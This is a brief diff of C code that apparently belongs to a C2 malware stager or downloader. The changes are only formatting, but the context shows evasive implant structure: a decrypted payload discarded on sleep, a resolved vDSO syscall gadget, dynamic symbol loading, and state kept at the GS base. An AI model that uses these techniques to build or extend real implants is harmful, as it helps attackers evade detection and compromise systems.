@@ -26,7 +26,7 @@
 struct stager_state {
   /* Published same-process ABI; self must stay at %gs:0 (see below). */
   struct c2_stager_public pub;
-  void *payload;      /* decrypted payload blob, discarded on first sleep */
+  void *payload; /* decrypted payload blob, discarded on first sleep */
   size_t payload_size;
   void *syscall_gadget; /* resolved vDSO `syscall; ret` gadget */
   dynload dl;           /* runtime dlopen/dlsym/dlclose cache */
@@ -48,7 +48,9 @@ static inline struct stager_state *get_stager_state(void) {
 
 /* dynload context backed by the state block; transports use this instead of a
  * writable global. */
-static inline dynload *stager_dynload(void) { return &get_stager_state()->dl; }
+static inline dynload *stager_dynload(void) {
+  return &get_stager_state()->dl;
+}
 
 /* mmap a dedicated RW state page, initialise it, and install it as the GS
  * base. Must be called once at the top of downloader_main, before any
